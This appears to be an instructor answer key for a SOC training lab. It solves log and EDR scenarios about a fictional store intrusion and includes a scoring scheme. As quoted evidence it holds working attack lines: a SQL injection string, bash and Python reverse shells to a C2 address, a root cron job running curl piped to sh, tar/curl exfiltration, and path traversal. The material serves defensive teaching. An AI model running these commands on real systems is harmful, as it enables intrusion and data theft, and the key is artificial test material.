# Day 5 SOC Lab — Worked Solutions

**Instructor material. Do not distribute to students before the debrief.**

Every value below was re-derived from the shipped evidence files, not copied from
the generator. Each row carries the command or line that proves it, so you can
run the derivation live on the projector instead of asserting the answer.

The lab has two acts:

- **Act One — the log/SIEM tier.** Five scenarios, solved from `access.log`,
  `auth.log`, and the five `evidence-*` artifacts.
- **Act Two — the EDR tier.** Four scenarios, solved from `edr.jsonl`. None of
  them are answerable from the web log.

---

## The discriminator that runs through the whole lab

Almost every hostile-looking event in `access.log` is **authorised**. Signature
hunting returns eleven candidate addresses and cannot rank them. Only three
questions can:

> **Was the source authorised? Was it inside the window? Did it stay in scope?**

`SCOPE.md` is the baseline for all three. A team that starts by grepping for
payloads is already losing; a team that starts by reading the rules of
engagement has the ranking function.

---

# ACT ONE — the SIEM tier

## Story Mode — "The Noise"

| Field | Answer |
|---|---|
| Source IP | `192.168.8.170` |
| Tool | `gobuster/3.8.2` (User-Agent) |
| Start (UTC) | `10:30:58` |
| End (UTC) | `10:31:27` — **29 seconds** |
| Total requests | **4,615** (≈159/sec) |
| 404 responses | **4,609** — 99.87% |
| Endpoints discovered | `/`, `/account`, `/admin` (403), `/login`, `/logout`, `/receipt` |
| Data obtained? | **No** |
| Authorised? | **Yes** |
| **Was Majal specifically targeted?** | **CANNOT BE DETERMINED** |

**Justification**

```bash
grep gobuster access.log | wc -l                    # 4615
grep gobuster access.log | awk '{print $9}' | sort | uniq -c | sort -rn
#   4609 404 · 3 302 · 2 200 · 1 403
grep gobuster access.log | head -1; grep gobuster access.log | tail -1
#   10:30:58 … 10:31:27
```

- **Filter on the User-Agent, not the IP.** `192.168.8.170` has 4,697 lines in
  the log; only 4,615 are the scan. The other 82 are the same tester browsing
  the site normally in Firefox 140 before and after. A team that reports 4,697
  has attributed a human's browsing to a tool.
- **"Data obtained? No"** is a claim about outcome, and it is provable: the
  scanner never issued `POST /login`, never held a session, and its only two
  `200`s are `/` and a static asset. `/admin` returned `403`. Nothing with
  customer content was served.
- **Authorised** on all three tests: on the tester list, inside the assessment
  window, and it stayed within `192.168.8.0/24` and the permitted endpoints.
- **"Specifically targeted" cannot be determined.** The log records what
  arrived, never intent. Nothing in the pack distinguishes "chose Majal" from
  "swept a range and Majal answered."

**The lesson.** This is the loudest thing in the dataset and it achieved
nothing — *but it was not harmless*. It mapped the attack surface, including
`/receipt` and `/admin`, the two endpoints abused later. **Loud ≠ dangerous, and
loud ≠ irrelevant. Judge by outcome, not by volume.**

---

## Easy — "The Letter"

| Field | Answer |
|---|---|
| Phish received | `26 Jul 22:14:07 +0300` = **`19:14:07 UTC`** |
| Sender | `no-reply@majal-store.co` (203.0.113.44) |
| Look-alike domain | `majal-store.co` vs. the real `majal.store` |
| SPF / DKIM / DMARC | **All pass** |
| Attack source IP | `192.168.0.157` |
| Activity window | `03:53:47` – `04:11:40 UTC` |
| Failed logins | **14** |
| Success | `04:09:31 UTC`, user **`student01`** (Hani Al-Qasimi, uid 3) |
| Object accessed | `/order/6` |
| Authorised? | **No** |
| **Did the victim enter credentials on the phishing page?** | **CANNOT BE DETERMINED** |

**Justification**

```bash
grep 192.168.0.157 auth.log | grep -c 'AUTH FAILURE'      # 14
grep 192.168.0.157 auth.log | grep 'AUTH SUCCESS'         # 04:09:31 student01 uid=3
grep 192.168.0.157 auth.log | grep 'OBJECT ACCESS'        # object=order/6 owner_uid=3
```

- **The timezone trap.** `evidence-01-phish.eml` is stamped `+0300`. Every other
  source in the pack is UTC. A team that writes `22:14` into the timeline is
  three hours out and every subsequent correlation breaks. This is the single
  highest-value trap in Act One and it is worth calling out in the debrief.
- **All three email authentication checks pass**, which is the point: SPF, DKIM
  and DMARC prove the message came from whoever owns `majal-store.co`. The
  attacker registered the domain, so they *do* own it. **Authentication passing
  is not the same as the sender being legitimate** — the defence is the
  look-alike domain, not the headers.
- **The failure pattern is username guessing, not password spraying.** The
  attempts walk `hani` → `h.alqasimi` → `hani.alqasimi` → … against what looks
  like one known password, then land on `student01`. That shape says the
  attacker had the password and was hunting for the account name — consistent
  with a credential phish, and it is *why* the phish and this session belong to
  one story.
- **Not authorised — fails two of the three tests.** `192.168.0.157` is outside
  the permitted `192.168.8.0/24`, and 04:00 is roughly five hours before the
  window opened.
- **The `cannot be determined`.** There are no harvester logs, no web logs from
  the phishing host, nothing recording a keystroke. That the attacker later had
  a working password is *consistent with* the victim typing it in, but it is an
  inference. The credential could have come from anywhere.

---

## Normal — "The Break-In"

| Field | Answer |
|---|---|
| Intruder IP | `192.168.8.33` |
| Session | `10:04:51` – `10:19:54 UTC`, 13 requests |
| SQLi success | `10:06:35 UTC` |
| Injected username | `admin' OR '1'='1'--` |
| Account obtained | `admin` (uid 1) |
| Command injection | `10:10:43 UTC` |
| Payload | `8.8.8.8; bash -i >& /dev/tcp/10.8.0.42/443 0>&1` |
| **C2 destination** | **`10.8.0.42:443`** |
| Beacon interval | **45 seconds**, 120 beacons |
| Compromised host | `majalstore` (`192.168.8.198`) |
| OS user context | **`www-data`** — not root |
| Genuine admin session | `192.168.8.5`, `10:12:08` – `10:22:19`, 10 requests |
| **Requests between 10:43 and 10:50?** | **CANNOT BE DETERMINED** |

**Justification**

```
Jul 29 10:06:02  AUTH FAILURE user="admin'--"            src=192.168.8.33
Jul 29 10:06:35  AUTH SUCCESS user="admin' OR '1'='1'--" src=192.168.8.33 uid=1
                 note=query_returned_multiple_rows
Jul 29 10:07:02  PRIV ESCALATION user='admin' role=administrator
Jul 29 10:10:43  ADMIN ACTION action=network_tools host='8.8.8.8; bash -i >& …'
```

- **`auth.log` is the only source carrying usernames.** The injected string
  never appears in `access.log` — it was a POST body. A team working only from
  the web log can see *that* something happened at 10:06 and cannot see *what*.
  Worth stating plainly: **the tier is unsolvable from one source.**
- **The failed attempt at 10:06:02 matters as much as the success.** `admin'--`
  is a probe; `admin' OR '1'='1'--` 33 seconds later is the working payload.
  That 33-second gap is a human iterating, and `note=query_returned_multiple_rows`
  is the database telling you exactly why it worked.
- **`www-data`, not root.** The shell inherits the web server's account. Teams
  routinely write "the attacker got root" — nothing in the pack supports it, and
  Act Two shows the actual privilege jump happening by a different route.
- **Two humans on one account, overlapping in time.** The intruder
  (`192.168.8.33`, Firefox 128) and the real administrator (`192.168.8.5`,
  Edge 150) are both authenticated as `admin` between 10:12 and 10:19. Separate
  them three ways: **source IP**, **User-Agent**, and **behaviour** — the
  intruder goes straight to `/admin` in 131 seconds, the administrator browses
  first. Confusing them means accusing a colleague.
- **The logging gap.** This is the `cannot be determined`, and it is visible in
  the data before it is explained:

  ```bash
  grep -o '29/Jul/2026:10:[345][0-9]' access.log | sort -u
  # 10:30 … 10:42, then 10:50 … 10:59   ← 10:43–10:49 absent
  ```

  `auth.log` explains the hole:

  ```
  Jul 29 10:43:00  SERVICE STOP  reason=log_rotation note='access logging suspended'
  Jul 29 10:50:00  SERVICE START note='access logging resumed; buffered requests not written'
  ```

  The requests were **never written**. Roughly 1,100 events are gone — not
  hidden, not corrupted, non-existent. Any team that interpolates from the
  traffic rate either side has **invented evidence**, and should be marked as
  such. Note for the debrief: the exfiltration in EDR I happens inside this
  gap. That is not a coincidence in the scenario design.

**Conclusion, not finding:** the store's alerting fired on none of this.

---

## Hard — "The Slow Drip"

| Field | Answer |
|---|---|
| Source IP | `192.168.8.24` |
| First request | `26 Jul 02:17:04 UTC` |
| Last request | `29 Jul 10:57:17 UTC` |
| Duration | **80 hours 40 minutes** |
| Technique | Path traversal, `/receipt?file=../../receipts/receipt_NNNN.txt` |
| Total requests | **237** |
| Distinct records | **94** of 120 receipts |
| Customers affected | **47** |
| Rate | ~3/hour, never a burst |
| Status codes | **All 200** |
| Hours of day active | **24 / 24** |
| **Was the data published or sold?** | **CANNOT BE DETERMINED** |

**Justification**

```bash
grep '192.168.8.24 ' access.log | wc -l                                  # 237
grep '192.168.8.24 ' access.log | grep -o 'receipt_[0-9]*' | sort -u | wc -l   # 94
```

- **237 requests, 94 distinct records.** These are different numbers and the
  distinction is the finding. The attacker re-requested receipts they had
  already pulled. A breach notification that says "237 customer records
  disclosed" overstates the harm by a factor of 2.5 — and under a real
  regulator, an inflated count is its own problem.
- **Every response is `200`.** There is no error signal, no anomaly, nothing for
  a threshold-based rule to fire on. Each individual request is a *valid* request
  for a *real* file. Only the aggregate is wrong.
- **How it is actually found: by profile, not by badness.** Bucket the traffic by
  hour of day. Human sessions collapse overnight. `192.168.8.24` is flat at
  04:00 and flat at 14:00 — 24/24 hours active, ~3/hour throughout. **Humans
  sleep; this did not.**
- **The false positive, and it is a good one.** `192.168.8.9` is *also*
  perfectly flat, with 1,007 requests across the same window — four times the
  volume:

  ```bash
  grep -c '192.168.8.9 ' access.log      # 1007
  grep '192.168.8.9 ' access.log | head -1
  # GET /healthz … "check_http/v2.3.3 (monitoring-plugins 2.3.3)"
  ```

  It is the **authorised monitoring probe**, and it only ever requests
  `/healthz`. A team that reports it has written up their own ops team.
  **Flat means automated. Automated does not mean hostile.** The discriminator
  is *what is being requested*, not the rhythm.
- **The `cannot be determined`.** The logs prove data left the building. Nothing
  in the pack observes anything downstream of that — no paste site, no forum, no
  buyer. Exfiltration is proven; publication is not.

**Sting for the debrief:** this started on **26 July, three days before the
assessment window**, required no authentication at all, and is **the only
reportable personal-data breach in the pack**. The noisy scan gets all the
attention; this is the one that generates the regulatory letter.

---

## Nightmare — "The Ghost"

| Field | Answer |
|---|---|
| Persistence artifact | User **`svc_backup`**, `is_admin=1` |
| Created | `10:14:08 UTC` by `admin` from `192.168.8.33` |
| Visible in | `evidence-04-store.db`, `auth.log`, `evidence-03-bash_history.txt` |
| Absent from | **`access.log`** |
| **OPSEC slip** | **One** request, `10:11:00 UTC`, `GET /admin`, from **`10.8.0.42`** |
| How the window leaked | `evidence-02` CC'd to `contractors-2026@partner-relay.example` |

**Justification**

```bash
grep -n '10\.8\.0\.42' access.log
# 5958:10.8.0.42 - - [29/Jul/2026:10:11:00 +0000] "GET /admin HTTP/1.1" 200 1876
#      "http://192.168.8.198/" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) … Firefox/128.0"
```

- **One line in 17,868.** The attacker's own machine touched the site directly,
  once, seventeen seconds after opening the reverse shell — almost certainly
  checking their work. Everything else came from `192.168.8.33`.
- **Why that one line is the highest-value artifact in Act One:** the address is
  `10.8.0.42`, which is the **C2 destination** from the command injection. Same
  Firefox 128 User-Agent as the intruder, mid-session. That single line welds
  "the machine that broke in" to "the machine receiving the shell" — it is what
  turns two separate observations into one actor.
- **`svc_backup` never appears in `access.log`.** It was created through the
  shell, not the web app. This is the structural lesson of the tier: **the web
  log is a record of HTTP, not a record of what happened.** Post-exploitation is
  invisible to it by construction, which is exactly why Act Two exists.

### The scope violation

`192.168.8.26` is a **genuine authorised tester** — on the list, inside the
window. They demonstrated the receipt flaw legitimately (`?file=flag.txt`, 404,
hunting the seeded flag, precisely as permitted). Then they used the same
traversal to pull `receipt_0001`–`0003`, which belong to **m.alfaisal, a real
customer**.

RoE §4.1 forbids retrieval of live customer data. **Right IP, right time, wrong
action.** The correct write-up is a *policy violation*, not an intrusion — and
because it names a real participant, it is a lesson in how carefully findings
about colleagues have to be worded.

### Attribution — the graded judgement

| Claim | Correct verdict | Why |
|---|---|---|
| Break-in and C2 are the same actor | **HIGH** | Slip address = C2 address. Direct shared indicator. |
| Intruder knew the assessment window | **MODERATE** | Notice leaked to an external relay; intrusion timed inside the window. Motive and opportunity, no proof. |
| Phish and break-in are one campaign | **LOW / cannot be determined** | No shared indicator whatsoever — different subnet, different day, no overlap. |
| Slow drip and break-in are one actor | **LOW** | Different address, no shared infrastructure, and it *predates* the break-in by three days. |

A team asserting one unified campaign at high confidence is **wrong**, and under
the scoring that is a −3 each. The evidence supports two of these links and not
the other two. **This is the field that separates the top team from the rest** —
not because the facts are harder, but because the discipline of saying "low
confidence" when you want to say "obviously it's all the same guy" is harder.

| **Attacker's real-world identity** | **CANNOT BE DETERMINED.** Any team naming a person or group has failed. |

---

# ACT TWO — the EDR tier

The sensor sees **process lineage**, **network connections attributed to a
process**, and **file activity**. It does **not** see HTTP.

That asymmetry is the entire point of the act: **more telemetry moves the
ceiling, it does not remove it.** Every scenario below is unanswerable from
`access.log`, and one of them is unanswerable even with EDR.

### The EDR-level decoy

```bash
grep '"type":"procstart"' edr.jsonl | grep -c '"process_name":"curl"'            # 111
grep '"type":"procstart"' edr.jsonl | grep '"process_name":"curl"' | grep -c healthz   # 107
```

Hunting `curl` returns **111 processes**. **107** are the container healthcheck
hitting `127.0.0.1:8080/healthz`. **Four** are hostile. Same 27:1 noise ratio as
the web log, one layer down — and note the sharper version of the lesson:
three of the four hostile ones are *also* parented by `cron` and *also* running
as `root`, exactly like the healthchecks. **Parentage does not separate them.
The destination address does.**

### Sources disagree — and the richer source wins

`evidence-03-bash_history.txt` ends at `10:18:41` with `history -c`, implying
the session stopped. EDR shows that **same `bash` process (guid `…0095`)
spawning children until 11:12:40** — nearly an hour later. The cleared history
was the attacker managing your perception of the timeline. When two sources
disagree, ask which one the attacker could edit.

---

## EDR I — The Ghost Shell

| Field | Answer |
|---|---|
| Packaging process | `tar` |
| Archive | `/tmp/.cache.tgz` |
| Size | **2,214,608 bytes** (~2.1 MB) |
| Uploaded to | `10.8.0.42:443` via `curl -s -T` at `10:45:33` |
| Fate of the archive | **Deleted** at `10:47:02` |
| Parent shell | `bash` — the 10:10:43 injection, still alive |
| **HTTP requests during the logging gap** | **CANNOT BE DETERMINED** |

**Justification** — the full sequence, all parented by the same `bash`:

```
10:44:05  procstart  tar     tar czf /tmp/.cache.tgz /var/www/app/receipts
10:44:16  filemod    tar     create /tmp/.cache.tgz   size=2214608
10:44:51  procstart  md5sum  md5sum /tmp/.cache.tgz
10:45:33  procstart  curl    curl -s -T /tmp/.cache.tgz https://10.8.0.42/u
10:47:02  procstart  rm      rm -f /tmp/.cache.tgz
10:47:02  filemod    rm      delete /tmp/.cache.tgz
```

- **A complete collection → staging → exfiltration → cleanup chain in three
  minutes**, and every single binary involved is a legitimate system tool with
  `TRUSTED_WHITE_LIST` reputation.
- **The size comes from the `filemod` event, not the `tar` command.** The
  command line tells you intent; `filemod_size=2214608` tells you what was
  actually written. Teams should cite the fact, not the instruction.
- **The `md5sum` is the attacker verifying their own transfer** — a small,
  human detail worth pointing at, because it is the kind of thing that survives
  in telemetry precisely because it looks routine.
- **The `rm` is anti-forensics**, and it is *why* the file will never be
  recovered from disk. The telemetry outlived the artifact. That is the argument
  for EDR in one line.
- **Timing.** `10:44`–`10:47` falls **inside the 10:43–10:50 web-log gap**. The
  most damaging action in the entire scenario happened in the window where the
  web log was blind. EDR was not.

**The `cannot be determined` is the point of the whole tier.** New telemetry
answered *what ran* and *what left*, and it still cannot answer *what was
requested over HTTP* — because the sensor does not parse HTTP. A team that
answers this one with a number has not understood what their new tool is.

---

## EDR II — Living off the Land

| Field | Answer |
|---|---|
| Interpreter | `python3` |
| Started | `11:02:14` |
| Destination port | **8443** |
| Parent | `bash` |
| Files written | **0** |
| Reputation of every binary | `TRUSTED_WHITE_LIST` |
| **MD5 of the malware** | **CANNOT BE DETERMINED** |

**Justification**

```
11:02:14  procstart  python3 (www-data)  parent=bash
  python3 -c import socket,os,pty;s=socket.socket();s.connect(('10.8.0.42',8443));
           [os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/sh')
11:02:14  netconn    python3 → 10.8.0.42:8443  tcp outbound  96 bytes
```

- **Port 8443, not 443.** This is a *second, independent* channel to the same
  C2 host. A responder who blocks `10.8.0.42:443` and declares victory has
  closed one of three doors. Getting students to notice the port is the whole
  exercise.
- **Zero files written.** The payload exists only as an argument on a command
  line and then only in memory. There is nothing on disk to scan, quarantine, or
  submit.
- **`process_md5` is `eba4d10c…` — that is the hash of `/usr/local/bin/python3`
  itself**, a legitimate interpreter that is *supposed* to be on the box.
  Blocking that hash breaks the application. **This is why the answer to "MD5 of
  the malware" is `cannot be determined`: there is no malware file.** A team
  that pastes the python3 hash has confused *the tool* with *the payload*, and
  the resulting block would be a self-inflicted outage.
- **Signature-based defence is structurally useless here** — not weak, not
  outdated. There is no artifact for it to have an opinion about.
- **The only available signal is the shape of the tree.** Trace the lineage:

  ```
  gunicorn (root)  --bind 0.0.0.0:8080
    └─ gunicorn worker (www-data)
        └─ sh -c ping -c 1 8.8.8.8; bash -i >& /dev/tcp/10.8.0.42/443 0>&1
            └─ bash -i
                └─ python3 -c import socket… 10.8.0.42:8443
  ```

  A **web server worker** has no business having a shell descendant, and that
  shell has no business spawning an interpreter that opens a socket. Every node
  is trusted; **the edges are the detection.** Note for accuracy in the debrief:
  the *immediate* parent of `python3` is `bash`, not `gunicorn` — the gunicorn
  worker is the root of the chain. Students should cite the lineage, not a
  single parent field.

---

## EDR III — The Cron That Came Back

| Field | Answer |
|---|---|
| Persistence file | `/etc/cron.d/majal-metrics` |
| Created | `10:16:30` |
| Interval | **30 minutes** |
| Runs as | **`root`** |
| Beacons observed | **3** — 10:30, 11:00, 11:30 |
| Destination port | **80** |
| Still active? | **Yes** |

**Justification**

```
10:16:30  procstart  sh (www-data)  parent=bash
  sh -c echo '*/30 * * * * root curl -s http://10.8.0.42/p | sh' > /etc/cron.d/majal-metrics
10:16:30  filemod    sh  create /etc/cron.d/majal-metrics

10:30:00  netconn  curl (root)  → 10.8.0.42:80
11:00:00  netconn  curl (root)  → 10.8.0.42:80
11:30:00  netconn  curl (root)  → 10.8.0.42:80
```

- **The interval is readable directly off the crontab line** (`*/30`) *and*
  confirmed by three observed beacons exactly 30 minutes apart. Two independent
  derivations of the same fact — that is what a well-cited finding looks like.
- **`root`, not `www-data`.** This is the **privilege jump** that Act One's
  break-in never achieved. The file was *written* by `www-data`, but the crontab
  line specifies `root` as the run-as user, so every beacon executes as root.
  The distinction between "who created it" and "who runs it" is the finding.
- **Port 80** — a third destination port on the same C2 host (443, 8443, 80).
- **`curl … | sh` means the payload is whatever the C2 serves at fetch time.**
  There is no fixed malware to analyse; the capability is decided remotely,
  every thirty minutes.
- **"Still active" is provable, not an impression.** The last beacon is 11:30:00
  and the last event in the entire dataset is 11:50:12 — twenty minutes later.
  The telemetry ends; the persistence does not.
  ```bash
  tail -1 edr.jsonl    # 2026-07-29T11:50:12.040Z
  ```

**Why this scenario exists.** It is the **second** persistence mechanism. A team
that found `svc_backup` in Nightmare and called the incident contained has
eradicated nothing — disable that account and the box still calls home every
half hour, **as root**, pulling fresh instructions. *Eradication requires
enumerating all persistence, not the first one you find.*

---

## EDR IV — The Pivot

| Field | Answer |
|---|---|
| Process | `ssh` |
| Destination | `192.168.8.7` (backup server) |
| Port | `22` |
| Time | `11:12:40` |
| Account targeted | `backup` |
| **Appearances in `access.log`** | **0** |
| **Did they get in?** | **CANNOT BE DETERMINED** |

**Justification**

```
11:12:40  procstart  ssh (www-data)  parent=bash
          ssh -o StrictHostKeyChecking=no backup@192.168.8.7
11:12:40  netconn    ssh → 192.168.8.7:22  tcp outbound
11:13:02  procend    ssh
```

- **This is lateral movement, and the web log cannot see it by construction** —
  it is an outbound SSH connection, not an inbound HTTP request. Grepping
  `access.log` for `192.168.8.7` returns nothing, and that is correct behaviour,
  not a gap in the data.
- **`StrictHostKeyChecking=no`** is the tell: the attacker is scripting a
  connection to a host they have never connected to before and does not want a
  prompt. It is a small flag that carries real intent.
- **The parent is the same `bash` from 10:10:43** — 62 minutes after the
  injection, and 54 minutes after `bash_history` claimed the session ended.
- **The session lasted 22 seconds** (`procstart` 11:12:40 → `procend` 11:13:02).
  Tempting to read as a failed auth. **Do not.** 22 seconds is equally
  consistent with a successful login that ran one command. The duration
  constrains nothing.

### The pair that the tier exists to test

These two rows sit deliberately side by side:

| Question | Answer | Type |
|---|---|---|
| Appearances in `access.log` | **`0`** | a **finding** — you looked, and there were none |
| Did they get in? | **CANNOT BE DETERMINED** | a **limit** — you have no instrument |

**Zero is a measurement. "Cannot be determined" is an absence of measurement.**
The sensor is installed on `majalstore` only; nothing observes `192.168.8.7`,
so no amount of care with the data you have will answer the second question.
The fix is not better analysis — it is **a sensor on the backup server**, which
is a *recommendation*, and belongs in the report as one.

Teams that answer `cannot be determined` to the first, or `0` to the second,
have confused the two. **That confusion is exactly what this tier is built to
expose**, and it is the most useful single thing an analyst can learn on Day 5.

---

# Scoring

| | |
|---|---|
| Correct, high confidence | **+2** |
| Correct, moderate or low | **+1** |
| Correct *cannot be determined* | **+3** |
| Valid evidence citation | **+1** |
| Wrong, low confidence | **−1** |
| **Wrong, high confidence** | **−3** |

> **A confidently wrong answer scores below "I don't know."**

Say this in the first ten minutes and mean it. It feels harsh for about ten
minutes and then it permanently changes how they think — because it is the real
professional incentive. **An analyst who invents a source IP does more damage
than one who admits uncertainty.**

There are **eight** `cannot be determined` fields across the lab. At +3 each
they are worth more than any other category, and a team that finds all eight has
demonstrated the thing the day is actually about.

### Expected reach

| Tier | Teams expected to finish |
|---|---|
| Story Mode | all |
| Easy | all |
| Normal | most |
| Hard | about half |
| Nightmare | one or two |
| EDR I–IV | those who finish Normal |

Nightmare is not meant to be completed by everyone. That is what the name is for.
